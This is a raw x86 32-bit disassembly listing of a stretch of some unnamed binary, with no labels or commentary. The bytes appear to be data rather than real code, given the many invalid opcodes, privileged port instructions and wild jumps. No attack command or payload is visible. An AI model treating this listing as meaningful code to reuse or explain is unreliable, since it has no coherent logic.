  418c4e:	mov    WORD PTR [esi+ebx*1],ss
  418c51:	mov    edx,0x79c550c
  418c56:	loop   0x418cd3
  418c58:	jns    0x418c40
  418c5a:	sub    al,0xe2
  418c5c:	icebp  
  418c5d:	xchg   eax,ebx
  418c5f:	mov    ebp,0x54ccc35d
  418c64:	in     eax,0x95
  418c66:	mov    dl,0xe6
  418c68:	mov    eax,0xd943dfe6
  418c6d:	daa    
  418c6e:	ss stc 
  418c70:	das    
  418c71:	shr    BYTE PTR [ebp-0x496daa83],1
  418c77:	mov    dh,0x47
  418c79:	xchg   edi,eax
  418c7a:	pushf  
  418c7b:	cli    
  418c7c:	cmp    al,0x49
  418c7e:	inc    edx
  418c7f:	pop    esp
  418c80:	dec    edi
  418c81:	ds xchg esp,eax
  418c83:	add    al,0x3c
  418c85:	and    eax,DWORD PTR [edi+0x78be13be]
  418c8b:	test   DWORD PTR [eax-0x34b4fe80],eax
  418c91:	sub    BYTE PTR [ebx+0x75a7c0b7],ah
  418c97:	cli    
  418c98:	push   esp
  418c99:	pop    ebx
  418c9a:	mov    DWORD PTR [ebx],0xf0491c0e
  418ca0:	inc    esp
  418ca1:	push   ecx
  418ca2:	in     eax,0xb5
  418ca4:	inc    esp
  418ca5:	xlat   BYTE PTR ds:[ebx]
  418ca6:	jmp    0xf6ad75ce
  418cab:	cmp    ebx,DWORD PTR [eax+0x1ae16cfb]
  418cb1:	fstp   QWORD PTR [ebx-0x5f634ac7]
  418cb7:	lea    edx,[esp+eiz*2]
  418cba:	(bad)  
  418cbb:	mov    eax,0x9a4294b1
  418cc0:	fst    DWORD PTR [eax+0x6f]
  418cc3:	inc    ebp
  418cc4:	out    0x33,eax
  418cc6:	adc    al,0x34
  418cc8:	sub    bh,ah
  418cca:	or     eax,0xb593fec0
  418ccf:	mov    bl,0x83
  418cd1:	in     eax,0x13
  418cd3:	mov    al,ah
  418cd5:	iret   
  418cd6:	and    eax,0x8abc4ed1
  418cdb:	repnz dec esp
  418cdd:	cmc    
  418cde:	add    BYTE PTR [edx-0x79],bl
  418ce1:	daa    
  418ce2:	dec    edx
  418ce3:	push   DWORD PTR [edx+0x1a]
  418ce6:	xor    al,BYTE PTR [esi+esi*2+0x35ddd544]
  418ced:	je     0x418c7a
  418cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cf0:	pop    edi
  418cf1:	aad    0xc3
  418cf3:	in     al,0xa3
  418cf5:	xchg   esp,ebx
  418cf7:	sub    dl,BYTE PTR es:[esp+0x399a1912]
  418cff:	or     BYTE PTR ds:0x126d53e6,dh
  418d05:	inc    edx
  418d06:	xchg   esp,eax
  418d07:	outs   dx,BYTE PTR ds:[esi]
  418d08:	cmp    bl,BYTE PTR [edi]
  418d0a:	pop    ss
  418d0b:	rol    DWORD PTR [ebx],cl
  418d0d:	push   ds
  418d0e:	sbb    esi,DWORD PTR [esi-0x372806]
  418d14:	xchg   DWORD PTR [edi+0x61b015ca],esp
  418d1a:	cdq    
  418d1b:	scas   al,BYTE PTR es:[edi]
  418d1c:	aaa    
  418d1d:	mov    ch,0xeb
  418d1f:	sahf   
  418d20:	gs lahf 
  418d22:	in     al,0x49
  418d24:	fcmovbe st,st(2)
  418d26:	add    cl,BYTE PTR [ebp+edi*4-0x62fc0f9a]
  418d2d:	aaa    
  418d2e:	mov    gs,WORD PTR [eax]
  418d30:	adc    esi,ecx
  418d32:	adc    al,0xa6
  418d34:	test   eax,0xc1af9b7a
  418d39:	rcr    esp,cl
  418d3b:	xchg   ecx,eax
  418d3c:	mov    ebx,0x4a98b809
  418d41:	push   es
  418d42:	shl    ecx,cl
  418d44:	adc    BYTE PTR ds:0xf4e7fdc2,0x75
  418d4b:	addr16 mov edx,0x316b7f85
  418d51:	jae    0x418d34
  418d53:	fcomp  DWORD PTR [edi]
  418d55:	xor    al,0x8b
  418d57:	leave  
  418d58:	adc    BYTE PTR [edi*8+0x2c0379ad],ch
  418d5f:	xchg   ebp,eax
  418d60:	jae    0x418db6
  418d62:	ficomp WORD PTR [edi+0x23]
  418d65:	mov    es,esi
  418d67:	inc    ecx
  418d68:	clc    
  418d69:	sub    ecx,esi
  418d6b:	and    al,0xdd
  418d6d:	xlat   BYTE PTR ds:[ebx]
  418d6e:	add    ebx,edx
  418d70:	gs ja  0x418d94
  418d73:	dec    ebp
  418d74:	cld    
  418d75:	popa   
  418d76:	outs   dx,BYTE PTR ds:[esi]
  418d77:	jg     0x418d83
  418d79:	push   es
  418d7a:	push   0xfffffff8
  418d7c:	pop    ebp
  418d7d:	outs   dx,BYTE PTR ds:[esi]
  418d7e:	xchg   ebp,eax
  418d7f:	sub    DWORD PTR [ecx+0x4],edx
  418d82:	ins    DWORD PTR es:[edi],dx
  418d83:	pop    esp
  418d84:	mov    al,ds:0x8c236a89
  418d89:	and    eax,0x5c2dd8cf
  418d8e:	pop    esp
  418d8f:	daa    
  418d90:	mov    si,0x1955
  418d94:	xor    ebp,DWORD PTR [esi]
  418d96:	xor    eax,0xe48caae1
  418d9b:	mov    WORD PTR [eax],?
  418d9d:	mov    bh,0xce
  418d9f:	jb     0x418d7c
  418da1:	shl    DWORD PTR [ebp+ebp*2-0x2dcc642],1
  418da8:	adc    al,0x5b
  418daa:	test   BYTE PTR [eax-0x8cc7b41],0xb
  418db1:	popa   
  418db2:	retf   
  418db3:	sub    eax,0x9efab4b5
  418db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db9:	ret    
  418dba:	lods   eax,DWORD PTR ds:[esi]
  418dbb:	inc    ebx
  418dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dbd:	ins    DWORD PTR es:[edi],dx
  418dbe:	sub    ah,BYTE PTR [edx]
  418dc0:	inc    ebp
  418dc1:	xchg   ebp,eax
  418dc2:	mov    WORD PTR [ecx-0x3413421],cs
  418dc8:	test   esp,ebx
  418dca:	jne    0x418de9
  418dcc:	stos   BYTE PTR es:[edi],al
  418dcd:	adc    edx,esi
  418dcf:	pop    ebp
  418dd0:	add    dh,bh
  418dd2:	cmp    eax,0xb6dfb69
  418dd7:	sub    bl,ch
  418dd9:	out    dx,al
  418dda:	cmp    bl,bh
  418ddc:	mov    ebx,0x30b46743
  418de1:	or     ecx,ebx
  418de3:	cld    
  418de4:	pop    ecx
  418de5:	hlt    
  418de6:	and    esp,DWORD PTR [edx]
  418de8:	pop    DWORD PTR [ebp+edi*4+0x2d]
  418dec:	sahf   
  418ded:	je     0x418df7
  418def:	aad    0x85
  418df1:	mov    dl,0x9c
  418df3:	shl    BYTE PTR [esi],0xcf
  418df6:	cmp    dl,0x5a
  418df9:	adc    bh,cl
  418dfb:	sub    al,0x7
  418dfd:	jns    0x418dd1
  418dff:	pop    ebp
  418e00:	xchg   edx,eax
  418e01:	and    DWORD PTR [ecx+0x64a2e14d],edx
  418e07:	mov    esp,0xa80328f3
  418e0c:	xor    al,0xcd
  418e0e:	xor    al,0xa9
  418e10:	push   ss
  418e11:	scas   eax,DWORD PTR es:[edi]
  418e12:	inc    eax
  418e13:	mov    dh,0xc0
  418e15:	test   al,0xa6
  418e17:	push   edi
  418e18:	push   0x5d5117e7
  418e1d:	sbb    eax,0x529f6bb
  418e22:	ins    DWORD PTR es:[edi],dx
  418e23:	stos   DWORD PTR es:[edi],eax
  418e24:	jmp    0x49cf:0x58468edd
  418e2b:	sub    ch,BYTE PTR [esp+edx*8-0x23]
  418e2f:	push   edx
  418e30:	xchg   ebp,eax
  418e31:	hlt    
  418e32:	jmp    0x418dfe
  418e34:	and    al,ch
  418e36:	gs mov dl,0x9b
  418e39:	js     0x418e98
  418e3b:	add    esi,0x10
  418e3e:	retf   0xdd89
  418e41:	xchg   esi,eax
  418e42:	icebp  
  418e43:	ins    BYTE PTR es:[edi],dx
  418e44:	inc    BYTE PTR [ecx+0x5a]
  418e47:	in     eax,dx
  418e48:	xor    ecx,DWORD PTR [ebp+eiz*8-0x2c]
  418e4c:	popa   
  418e4d:	dec    esi
  418e4e:	out    dx,eax
  418e4f:	int    0x4c
  418e51:	icebp  
  418e52:	in     al,dx
  418e53:	and    BYTE PTR [edx+0x55],dl
  418e56:	jecxz  0x418eae
  418e58:	outs   dx,DWORD PTR ds:[esi]
  418e59:	cmp    DWORD PTR [edi+0x1d020340],esi
  418e5f:	inc    ebp
  418e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e61:	fbld   TBYTE PTR [edx]
  418e63:	out    dx,eax
  418e64:	and    al,0x62
  418e66:	int3   
  418e67:	(bad)  
  418e68:	mov    ebx,0x77a90621
  418e6d:	sub    al,0x44
  418e6f:	leave  
  418e70:	or     eax,0xffffffa9
  418e73:	setne  BYTE PTR [edx-0x44]
  418e77:	push   ebp
  418e78:	lahf   
  418e79:	adc    esi,esi
  418e7b:	adc    BYTE PTR [edi],0x2b
  418e7e:	mov    dl,0xee
  418e80:	push   ecx
  418e82:	into   
  418e83:	shl    DWORD PTR [eax],0xfe
  418e86:	iret   
  418e87:	sub    DWORD PTR [eax-0x5be1c592],0xfffffff2
  418e8e:	jmp    0x418e71
  418e90:	outs   dx,DWORD PTR ds:[esi]
  418e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e92:	enter  0x30a8,0xc3
  418e96:	rcl    BYTE PTR [edi],cl
  418e98:	pop    edx
  418e99:	pop    edx
  418e9a:	dec    esi
  418e9b:	daa    
  418e9c:	hlt    
  418e9d:	ss retf 
  418e9f:	in     al,dx
  418ea0:	mov    WORD PTR [esi-0x5112966b],ds
  418ea6:	dec    esp
  418ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ea8:	aaa    
  418ea9:	or     dh,BYTE PTR [eax]
  418eab:	pop    eax
  418eac:	cmp    esp,DWORD PTR [ebp-0x79]
  418eaf:	cmp    dh,BYTE PTR [ebx-0x52431e72]
  418eb5:	push   edi
  418eb6:	idiv   ah
  418eb8:	jg     0x418eee
  418eba:	clc    
  418ebb:	out    0x5c,al
  418ebd:	sub    bh,BYTE PTR [ebx+ecx*4]
  418ec0:	or     esp,DWORD PTR [eax+0x1b1309d4]
  418ec6:	fdivr  DWORD PTR [edx+edx*8-0x40]
  418eca:	mov    dl,0x8f
  418ecc:	xor    dl,BYTE PTR [esi-0x35]
  418ecf:	inc    ecx
  418ed0:	add    eax,esi
  418ed2:	xchg   ebx,eax
  418ed3:	sbb    dl,BYTE PTR [esi+0x7b0bb188]
  418ed9:	and    al,0x62
  418edb:	cmp    al,0x28
  418edd:	out    0xea,al
  418edf:	fdiv   DWORD PTR ds:0x3ab107c6
  418ee5:	push   esi
  418ee6:	arpl   di,dx
  418ee8:	sub    eax,0xf9bc8430
  418eed:	or     ch,BYTE PTR fs:[edx+esi*4-0x3b]
  418ef2:	imul   eax,DWORD PTR [ebx],0x12
  418ef5:	mov    cl,0xb4
  418ef7:	mov    dl,BYTE PTR [ebx+0x37]
  418efa:	sbb    eax,0x92d47dfc
  418eff:	(bad)  
  418f00:	aam    0xd7
  418f02:	cmp    edi,DWORD PTR [eax-0x38d8b8b8]
  418f08:	mov    ebx,0xb3125ca3
  418f0d:	adc    bl,BYTE PTR [ebx]
  418f0f:	jmp    0x768c:0xef26b66a
  418f16:	inc    edi
  418f17:	jbe    0x418f02
  418f19:	jl     0x418e9f
  418f1b:	into   
  418f1c:	jl     0x418f86
  418f1e:	push   ebx
  418f1f:	mov    dl,0x1e
  418f21:	pop    edx
  418f22:	mov    WORD PTR [esi],?
  418f24:	leave  
  418f25:	push   esi
  418f26:	mov    ebp,0x552ae6d2
  418f2b:	sub    BYTE PTR [ebx],bh
  418f2d:	xor    BYTE PTR [ebp+0x28],al
  418f30:	dec    eax
  418f31:	nop
  418f32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f33:	fdiv   QWORD PTR [ebx-0x40]
  418f36:	and    eax,0x87560b6c
  418f3b:	in     eax,dx
  418f3c:	push   ebx
  418f3d:	outs   dx,DWORD PTR ds:[esi]
  418f3e:	aas    
  418f3f:	(bad)  
  418f40:	mov    ds:0x3bd1787f,al
  418f45:	mov    edx,0xf1135ad
  418f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f4b:	out    0x84,al
  418f4d:	fild   DWORD PTR ds:0xb1783eda
  418f53:	fstp   TBYTE PTR [esi+0x77]
  418f56:	push   esi
  418f57:	gs es sahf 
  418f5a:	cld    
  418f5b:	dec    ebp
  418f5c:	test   al,0xa4
  418f5e:	(bad)  
  418f60:	cmc    
  418f61:	mov    dh,BYTE PTR [eax+edi*8+0x3b]
  418f65:	cmp    dl,dl
  418f67:	jmp    0x2eb:0xb8c5cddc
  418f6e:	fnsave [ebx-0x38]
  418f71:	jl     0x418fa9
  418f73:	jnp    0x418ef5
  418f75:	pop    edx
  418f76:	daa    
  418f77:	or     ecx,DWORD PTR ds:0x8c5cb7ba
  418f7d:	mov    ebp,DWORD PTR fs:[ecx]
  418f80:	jns    0x418f58
  418f82:	addr16 cs jns 0x418f1a
  418f86:	sahf   
  418f87:	into   
  418f88:	mov    dl,0xaa
  418f8a:	xchg   edx,eax
  418f8b:	std    
  418f8c:	int    0x7e
  418f8e:	lahf   
  418f8f:	xor    eax,DWORD PTR [eax-0x4200afa5]
  418f95:	dec    ecx
  418f96:	sub    BYTE PTR [ebx],al
  418f98:	repnz inc eax
  418f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f9b:	jg     0x418fa5
  418f9d:	push   cs
  418f9e:	mov    al,ds:0xf67fa6a
  418fa3:	jmp    0x4e50:0x7be91676
  418faa:	jnp    0x418fef
  418fac:	sbb    eax,0x8f88b306
  418fb1:	pop    ds
  418fb2:	lods   eax,DWORD PTR ds:[esi]
  418fb3:	sar    ch,0x7c
  418fb6:	pop    esp
  418fb7:	dec    ecx
  418fb8:	adc    edi,DWORD PTR [eax]
  418fba:	dec    ebx
  418fbb:	mov    esp,DWORD PTR [eax-0x3f3d39da]
  418fc1:	rol    BYTE PTR ds:0x5f25e94e,0x19
  418fc8:	ret    0xd024
  418fcb:	and    edx,DWORD PTR [edi+eax*1-0x445c27cb]
  418fd2:	dec    ebx
  418fd3:	or     edi,DWORD PTR [edx]
  418fd5:	jp     0x419053
  418fd7:	aam    0x35
  418fd9:	shr    BYTE PTR [esp+edi*4],1
  418fdc:	dec    esp
  418fdd:	jge    0x41902e
  418fdf:	test   BYTE PTR [esi-0x4c],al
  418fe2:	call   DWORD PTR [edx+edi*2]
  418fe5:	js     0x419011
  418fe7:	cmc    
  418fe8:	jmp    0x1629:0xf1058849
  418fef:	ds sti 
  418ff1:	in     al,dx
  418ff2:	lahf   
  418ff3:	cmp    dl,0x74
  418ff6:	aaa    
  418ff7:	call   0xf9fb2bd7
  418ffc:	cmp    bl,BYTE PTR [ecx+0x70]
  418fff:	or     DWORD PTR [ebp+0xb8d9450],0x9b8d3302
  419009:	lods   eax,DWORD PTR ds:[esi]
  41900a:	cwde   
  41900b:	cli    
  41900c:	loope  0x418fe6
  41900e:	cmp    al,BYTE PTR [ecx]
  419010:	es jge 0x41907a
  419013:	inc    eax
  419014:	popf   
  419015:	push   esp
  419016:	rcr    edx,cl
  419018:	xlat   BYTE PTR ds:[ebx]
  419019:	jl     0x419018
  41901b:	and    DWORD PTR [esi+0x0],ebp
  41901e:	jp     0x41901b
  419020:	test   BYTE PTR [ecx-0x2ecb395b],bh
  419026:	inc    esp
  419027:	lods   eax,DWORD PTR ds:[esi]
  419028:	inc    ebx
  419029:	mov    ah,cl
  41902b:	fild   DWORD PTR [edi-0x56]
  41902e:	pusha  
  41902f:	mov    WORD PTR [edi-0x4f756465],fs
  419035:	jl     0x418fd7
  419037:	jns    0x41907f
  419039:	call   FWORD PTR [edi+0x45d86488]
  41903f:	pushf  
  419040:	lahf   
  419041:	mov    edx,0xb107a7d7
  419046:	sub    al,0x30
  419048:	rcl    DWORD PTR [edi],cl
  41904a:	das    
  41904b:	mov    dl,0x13
  41904d:	inc    ecx
  41904e:	je     0x419065
  419050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419051:	enter  0x91e8,0x96
  419055:	sbb    ebp,DWORD PTR [ebx-0x61053b30]
  41905b:	dec    eax
  41905c:	inc    ecx
  41905d:	jmp    0xcd6b6bef
  419062:	adc    bh,al
  419064:	lods   eax,DWORD PTR ds:[esi]
  419065:	xchg   ebp,eax
  419066:	cmp    DWORD PTR [esp+ebx*1-0x4c],0x42b73ff3
  41906e:	stos   DWORD PTR es:[edi],eax
  41906f:	test   eax,0x991c0a32
  419074:	jmp    0x4190c6
  419076:	mov    ah,0x4f
  419078:	sbb    BYTE PTR [edi+0x370304e5],dh
  41907e:	imul   ecx,DWORD PTR [edi],0x4e61c14
  419084:	inc    ebx
  419085:	xlat   BYTE PTR ds:[ebx]
  419086:	jmp    0x7a9c1106
  41908b:	mov    edi,0xf728c307
  419090:	es dec esp
  419092:	mov    al,ds:0x2f1508d
  419097:	or     al,0x11
  419099:	add    dl,ch
  41909b:	(bad)  
  41909c:	out    dx,al
  41909d:	shr    ecx,1
  41909f:	adc    al,0xbf
  4190a1:	outs   dx,BYTE PTR ds:[esi]
  4190a2:	call   0x9c5a0047
  4190a7:	int    0xdb
  4190a9:	mov    ebp,0x3f6b885
  4190ae:	lock retfw 0x8064
  4190b3:	fisttp DWORD PTR [esp+ecx*4]
  4190b6:	mov    ebx,0xf5a20684
  4190bb:	add    esi,DWORD PTR [edx-0x2524fc0e]
  4190c1:	call   0x3f1e:0x8ccb5300
  4190c8:	shl    DWORD PTR [ebx+0x2f],0xe8
  4190cc:	push   cs
  4190cd:	pop    edi
  4190ce:	mov    dh,0xc4
  4190d0:	rcl    DWORD PTR [eax],1
  4190d2:	or     edx,DWORD PTR [ebp+0x31]
  4190d5:	and    ah,dh
  4190d7:	data16 mov al,0xce
  4190da:	ret    0x8cd1
  4190dd:	pop    ebp
  4190de:	add    eax,0xc5a62dab
  4190e3:	jb     0x41909c
  4190e5:	(bad)  
  4190e6:	(bad)  
  4190e7:	xor    bh,dl
  4190e9:	(bad)  
  4190ea:	out    dx,al
  4190eb:	das    
  4190ec:	ins    DWORD PTR es:[edi],dx
  4190ed:	sbb    BYTE PTR [ecx],ch
  4190ef:	mov    ebx,0x3dddf8bc
  4190f4:	push   ebx
  4190f5:	fcmovnbe st,st(5)
  4190f7:	add    BYTE PTR [eax-0x9],al
  4190fa:	cmp    BYTE PTR [ebx*1-0x5ae5faa],0xb6
  419102:	fidivr DWORD PTR [esp+eiz*2]
  419105:	cwde   
  419106:	mov    eax,0x40044e58
  41910b:	push   ds
  41910c:	es xor bh,0xd4
  419110:	test   al,0x79
  419112:	mov    dl,BYTE PTR [eax-0x38a9dea]
  419118:	inc    edi
  419119:	inc    ebp
  41911a:	and    BYTE PTR [edi-0x26],ch
  41911d:	mov    dl,0x19
  41911f:	addr16 icebp 
  419121:	mov    ebp,0x103f5113
  419126:	enter  0xb2db,0xd1
  41912a:	stc    
  41912b:	cmp    eax,0xe34fd293
  419130:	xchg   ecx,eax
  419131:	bound  edx,QWORD PTR [ebx+0x4163f32f]
  419137:	jl     0x4191b7
  419139:	cmp    ah,BYTE PTR [edx]
  41913b:	aaa    
  41913c:	loopne 0x4190c9
  41913e:	add    eax,0x79018e8f
  419143:	add    BYTE PTR [ebx-0x3caab361],ch
  419149:	call   0xb32012e2
  41914e:	andps  xmm1,XMMWORD PTR [ebp+0x19]
  419152:	xlat   BYTE PTR ds:[ebx]
  419153:	stc    
  419154:	in     al,0xf5
  419156:	lock mov cl,0xb3
  419159:	enter  0xa943,0xa3
  41915d:	arpl   WORD PTR [edx-0x44fa65b4],si
  419163:	bound  eax,QWORD PTR [eax-0x4e99090a]
  419169:	enter  0x4e5a,0x51
  41916d:	mov    dl,0xf7
  41916f:	add    ebp,DWORD PTR [esi]
  419171:	and    ebx,edi
  419173:	push   ss
  419174:	lahf   
  419175:	sub    al,0xea
  419177:	jns    0x41916c
  419179:	popa   
  41917a:	clc    
  41917b:	into   
  41917c:	mov    dh,0x24
  41917e:	xor    eax,0xa054aa4c
  419183:	ins    BYTE PTR es:[edi],dx
  419184:	mul    al
  419186:	ins    DWORD PTR es:[edi],dx
  419187:	imul   esi,DWORD PTR [ebp-0x7c],0x4f75537f
  41918e:	fisubr DWORD PTR [eax-0x5f48caec]
  419194:	jo     0x4191b3
  419196:	mov    WORD PTR [ebp-0x38],ds
  419199:	dec    edx
  41919a:	adc    BYTE PTR [esi+0x3907db7e],dh
  4191a0:	ja     0x419137
  4191a2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4191a4:	mov    esp,edi
  4191a6:	push   ecx
  4191a7:	lahf   
  4191a8:	add    al,0x15
  4191aa:	jle    0x4191da
  4191ac:	mov    edx,0x571daeae
  4191b1:	test   bl,bl
  4191b3:	test   al,0xfd
  4191b5:	popf   
  4191b6:	out    0x55,eax
  4191b8:	jecxz  0x4191b3
  4191ba:	call   0xd0dc610a
  4191bf:	xchg   edi,eax
  4191c0:	mov    eax,0xd55529e2
  4191c5:	sub    al,0xc7
  4191c7:	inc    edi
  4191c8:	dec    esi
  4191c9:	pop    ss
  4191ca:	jb     0x419157
  4191cc:	push   esi
  4191ce:	pop    ebx
  4191cf:	in     al,0xa7
  4191d1:	inc    esp
  4191d2:	adc    bh,BYTE PTR [esi+0x492246d0]
  4191d8:	or     ah,BYTE PTR [ecx+0x36]
  4191db:	sub    ecx,DWORD PTR [ecx]
  4191dd:	dec    edx
  4191de:	xchg   DWORD PTR [ebx-0x7077a19],edx
  4191e4:	cld    
  4191e5:	int    0x26
  4191e7:	xchg   edx,eax
  4191e8:	inc    esi
  4191e9:	cmp    cl,ch
  4191eb:	jmp    0x59dea0c4
  4191f0:	add    al,0xe0
  4191f2:	aaa    
  4191f3:	ja     0x41920e
  4191f5:	pop    ebx
  4191f6:	int3   
  4191f7:	jp     0x419190
  4191f9:	xor    dl,BYTE PTR [esi]
  4191fb:	retf   0xe3cf
  4191fe:	dec    eax
  4191ff:	scas   eax,DWORD PTR es:[edi]
  419200:	cmp    DWORD PTR [ecx],0xe1e09ecf
  419206:	fisttp WORD PTR [ecx]
  419208:	fs call 0x93a7c049
  41920e:	mov    edx,0x3475fc7e
  419213:	mov    esp,0x2ae38ce
  419218:	stc    
  419219:	fwait
  41921a:	mov    esi,0x2b2951c
  41921f:	xor    eax,DWORD PTR [ebp-0x79]
  419222:	cdq    
  419223:	inc    ebx
  419224:	push   es
  419225:	sub    eax,0x51653b2e
  41922a:	pop    ds
  41922b:	xor    edx,DWORD PTR [ebx+eax*2]
  41922e:	xchg   ebx,eax
  41922f:	pop    esp
  419230:	sbb    BYTE PTR [esi-0x3ea8bfee],cl
  419236:	lahf   
  419237:	inc    eax
  419238:	jmp    0x4191cb
  41923a:	mov    eax,0x232d983a
  41923f:	(bad)  
  419240:	sbb    ch,BYTE PTR [edi]
  419242:	xchg   esp,eax
  419243:	lahf   
  419244:	scas   al,BYTE PTR es:[edi]
  419245:	inc    eax
  419246:	adc    DWORD PTR [ecx],esi
  419248:	push   edx
  419249:	test   eax,0xacf983e
  41924e:	inc    esp
  41924f:	jno    0x41924f
  419251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419252:	dec    esi
  419253:	imul   ecx,DWORD PTR [ecx+0x1c],0xdc4ce9c9
  41925a:	push   ss
  41925b:	lods   al,BYTE PTR ds:[esi]
  41925c:	mov    ah,0xfd
  41925e:	add    bl,BYTE PTR [esi+0x63664030]
  419264:	je     0x419249
  419266:	dec    esp
  419267:	mov    cl,0x26
  419269:	(bad)
  41926d:	mov    BYTE PTR [esi-0x4f],0x7b
  419271:	and    esp,ebp
  419273:	mov    ?,WORD PTR [ecx+0xd]
  419276:	(bad)  
  419277:	mov    ecx,DWORD PTR [eax+ebx*1]
  41927a:	or     BYTE PTR [ecx],dl
  41927c:	loope  0x419231
  41927e:	mov    ah,0x69
  419280:	lea    edx,[ecx]
  419282:	dec    edi
  419283:	sub    eax,0x6f890159
  419288:	js     0x4192ab
  41928a:	scas   al,BYTE PTR es:[edi]
  41928b:	sub    DWORD PTR [ebp-0x43],ebp
  41928e:	mov    gs,esi
  419290:	dec    eax
  419291:	outs   dx,DWORD PTR ds:[esi]
  419292:	fmul   DWORD PTR [ebx+0x39f083f5]
  419298:	rcl    DWORD PTR [edi],1
  41929a:	scas   al,BYTE PTR es:[edi]
  41929b:	push   esi
  41929c:	stos   BYTE PTR es:[edi],al
  41929d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41929e:	call   0x3114d011
  4192a3:	shl    DWORD PTR [edx],0x83
  4192a6:	ins    BYTE PTR es:[edi],dx
  4192a7:	adc    ah,BYTE PTR [edi+0x48]
  4192aa:	rcl    BYTE PTR [edi+0x7f],cl
  4192ad:	cmc    
  4192ae:	mul    BYTE PTR [eax]
  4192b0:	repnz inc edi
  4192b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192b3:	int3   
  4192b4:	jbe    0x419319
  4192b6:	(bad)  
  4192b8:	pop    ss
  4192b9:	xor    al,0x36
  4192bb:	jno    0x419243
  4192bd:	sub    dh,dl
  4192bf:	ja     0x419268
  4192c1:	je     0x419289
  4192c3:	mov    WORD PTR [eiz*4+0x2d167e5d],?
  4192ca:	xchg   ecx,esi
  4192cc:	adc    ah,BYTE PTR [ecx-0x6b]
  4192cf:	add    esi,ebp
  4192d1:	aaa    
  4192d2:	xor    eax,0xab365ffb
  4192d7:	mov    BYTE PTR [edx],bl
  4192d9:	in     al,dx
  4192da:	fidiv  DWORD PTR [edx-0x6f59d58d]
  4192e0:	pop    edx
  4192e1:	lsl    edx,WORD PTR [eax+ebx*4]
  4192e5:	ins    DWORD PTR es:[edi],dx
  4192e6:	inc    ecx
  4192e7:	cmp    edi,DWORD PTR [esp+eiz*8]
  4192ea:	jl     0x419314
  4192ec:	pushf  
  4192ed:	jno    0x419349
  4192ef:	sub    eax,0xa726a206
  4192f4:	mov    bl,0x5b
  4192f6:	mov    ds:0x3be86b4b,eax
  4192fb:	jnp    0x419322
  4192fd:	jnp    0x4192cd
  4192ff:	jecxz  0x4192e7
  419301:	sub    DWORD PTR [edx+ebp*2+0x7d],esp
  419305:	pusha  
  419306:	jmp    0x3ca:0x3d10900d
  41930d:	push   edi
  41930e:	and    edx,DWORD PTR [ebp+0x64]
  419311:	mov    ebx,0x627c4e18
  419316:	les    eax,FWORD PTR [ecx+0x402b2a23]
  41931c:	retf   0x11b8
  41931f:	das    
  419320:	sub    eax,0xb9b04aef
  419325:	push   edi
  419326:	test   al,0xa0
  419328:	jb     0x41935e
  41932a:	dec    esi
  41932b:	sub    ebx,DWORD PTR [eax+edx*8+0x71]
  41932f:	cmc    
  419330:	xchg   edi,eax
  419331:	push   ebx
  419332:	push   ebp
  419333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419334:	ret    
  419335:	and    cl,ch
  419337:	loopne 0x419318
  419339:	xor    edi,DWORD PTR [ecx+eiz*8]
  41933c:	mov    edi,0x575b9044
  419341:	or     DWORD PTR [ecx+ebp*1+0x54],0x9e1825bd
  419349:	ret    
  41934a:	mov    al,ds:0x18040bd0
  41934f:	add    eax,0x17d8aea1
  419354:	dec    esi
  419355:	hlt    
  419356:	or     cl,BYTE PTR gs:[eax-0x1d]
  41935a:	mov    esi,0xb95990df
  41935f:	scas   eax,DWORD PTR es:[edi]
  419360:	idiv   bl
  419362:	add    al,0xc1
  419364:	sbb    ch,BYTE PTR [ecx-0x6ec3b652]
  41936a:	mov    edx,0xb24e0ea
  41936f:	mov    ecx,0xd2b481bd
  419374:	xchg   BYTE PTR [esi],dh
  419376:	dec    ebx
  419377:	jecxz  0x41933f
  419379:	in     eax,dx
  41937a:	fisttp WORD PTR [esi+0x2c]
  41937d:	mov    ds:0x4e86f18,al
  419382:	mov    ds:0xd7cd10bd,eax
  419387:	mov    ch,0xb4
  419389:	inc    edi
  41938a:	mov    BYTE PTR [esi-0x74],cl
  41938d:	inc    edi
  41938e:	xchg   edi,eax
  41938f:	xchg   bx,ax
  419391:	dec    ecx
  419392:	push   esi
  419393:	pcmpgtb mm4,QWORD PTR [ebp+ecx*4+0x3a]
  419398:	hlt    
  419399:	cmc    
  41939a:	ror    BYTE PTR [edi+0x30e6db10],0x52
  4193a1:	mov    ?,WORD PTR [edx]
  4193a3:	add    eax,0x72a0d8a7
  4193a8:	jle    0x419424
  4193aa:	sbb    al,0xd3
  4193ac:	mov    edi,0x61644db5
  4193b1:	mov    eax,edx
  4193b3:	in     ax,dx
  4193b5:	push   ecx
  4193b6:	cli    
  4193b7:	stos   DWORD PTR es:[edi],eax
  4193b8:	sbb    eax,0xfb1462f
  4193bd:	test   eax,0xd9962a17
  4193c2:	outs   dx,BYTE PTR ds:[esi]
  4193c3:	or     ecx,eax
  4193c5:	sub    al,0x62
  4193c7:	sub    esp,DWORD PTR [eax]
  4193c9:	data16 (bad) 
  4193cb:	sti    
  4193cc:	push   cs
  4193cd:	sub    eax,0x6355f11c
  4193d2:	dec    esi
  4193d3:	sbb    eax,0xd80113f5
  4193d8:	sbb    eax,0x9d833be6
  4193dd:	cmp    eax,0x28520095
  4193e2:	pop    ds
  4193e3:	fs sub al,0xd4
  4193e6:	ins    BYTE PTR es:[edi],dx
  4193e7:	dec    ebx
  4193e8:	out    0x91,al
  4193ea:	ror    DWORD PTR [eax-0x13],0xcc
  4193ee:	in     al,dx
  4193ef:	xchg   ebx,eax
  4193f0:	inc    ecx
  4193f1:	in     eax,dx
  4193f2:	sub    edx,DWORD PTR [ebx+ebx*1+0x5a]
